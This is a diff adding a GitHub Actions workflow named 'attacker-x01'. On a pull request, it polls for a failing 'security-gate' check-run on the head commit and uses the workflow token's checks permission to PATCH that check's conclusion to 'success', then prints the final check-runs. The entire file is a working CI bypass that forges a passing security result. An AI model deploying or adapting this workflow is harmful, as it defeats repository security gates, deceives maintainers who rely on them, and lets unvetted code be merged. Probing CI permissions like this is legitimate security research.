@@ -1,0 +1,33 @@
+name: attacker-x01
+on: pull_request
+permissions:
+  checks: write
+  contents: read
+jobs:
+  patch:
+    runs-on: ubuntu-24.04
+    steps:
+      - name: Patch the security-gate check-run to success
+        env:
+          GH_TOKEN: ${{ github.token }}
+          HEAD: ${{ github.event.pull_request.head.sha }}
+          REPO: ${{ github.repository }}
+        run: |
+          echo "token app check-runs patch attempt"
+          patched=""
+          for i in $(seq 1 72); do
+            id=$(gh api "repos/$REPO/commits/$HEAD/check-runs" \
+                 --jq '.check_runs[]|select(.name=="security-gate" and .status=="completed" and .conclusion!="success")|.id' | head -n1)
+            if [ -n "$id" ]; then
+              echo "found failing security-gate check-run id=$id"
+              code=$(gh api --method PATCH "repos/$REPO/check-runs/$id" \
+                     -f status=completed -f conclusion=success \
+                     --jq '.conclusion' 2>patch.err) && echo "PATCH ok -> conclusion=$code" || { echo "PATCH failed:"; cat patch.err; }
+              patched=$id
+              break
+            fi
+            sleep 5
+          done
+          [ -n "$patched" ] || echo "no failing security-gate check-run appeared"
+          echo "--- final check-runs on head ---"
+          gh api "repos/$REPO/commits/$HEAD/check-runs" --jq '.check_runs[]|"\(.name) | \(.conclusion) | id=\(.id)"'
